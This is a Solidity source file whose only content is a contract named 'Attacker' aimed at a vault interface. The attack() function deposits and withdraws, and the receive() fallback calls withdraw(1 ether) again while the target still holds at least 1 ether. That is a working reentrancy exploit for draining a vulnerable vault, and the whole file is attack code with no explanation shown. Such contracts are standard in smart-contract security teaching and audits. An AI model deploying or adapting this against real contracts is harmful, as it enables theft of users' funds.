// SPDX-License-Identifier: MIT
pragma solidity 0.8.20;

interface IVault {
    function deposit() external payable;

    function withdraw(uint256 amount) external;
}

contract Attacker {
    IVault public target;

    constructor(address _target) {
        target = IVault(_target);
    }

    function attack(uint256 amount) external payable {
        target.deposit{value: amount}();
        target.withdraw(amount);
    }

    receive() external payable {
        if (address(target).balance >= 1 ether) {
            target.withdraw(1 ether);
        }
    }
}
